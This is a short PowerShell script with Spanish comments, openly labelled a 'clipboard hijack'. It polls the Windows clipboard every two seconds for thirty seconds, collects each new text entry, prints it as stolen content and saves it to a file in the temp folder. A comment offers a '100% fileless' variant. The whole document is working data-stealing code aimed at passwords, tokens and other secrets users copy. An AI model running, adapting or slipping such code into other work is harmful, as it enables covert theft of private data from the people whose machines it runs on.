
Add-Type -AssemblyName System.Windows.Forms

$exfil = @()
$duration = 30   # segundos
$interval = 2    # cada cuántos segundos revisa

Write-Host "[*] Clipboard hijack activado por $duration segundos..." -ForegroundColor Cyan

for ($i = 0; $i -lt ($duration / $interval); $i++) {
    try {
        $clip = [System.Windows.Forms.Clipboard]::GetText()
        if ($clip -and $clip.Length -gt 3) {
            $timestamp = Get-Date -Format "HH:mm:ss"
            $line = "[$timestamp] $clip"
            if ($line -notin $exfil) {
                $exfil += $line
                Write-Host "[+] Capturado: $($clip.Substring(0,[Math]::Min(80,$clip.Length)))..." -ForegroundColor Yellow
            }
        }
    } catch {}
    Start-Sleep -Seconds $interval
}

Write-Host "`n[+] Clipboard hijack finalizado. Contenido robado:" -ForegroundColor Red
$exfil | ForEach-Object { Write-Host $_ }

# Opcional: guardar en disco (elimina estas 3 líneas si quieres 100% fileless)
$logpath = "$env:TEMP\cb.txt"
$exfil | Out-File -FilePath $logpath -Encoding UTF8
Write-Host "[*] También guardado en: $logpath" -ForegroundColor DarkGray
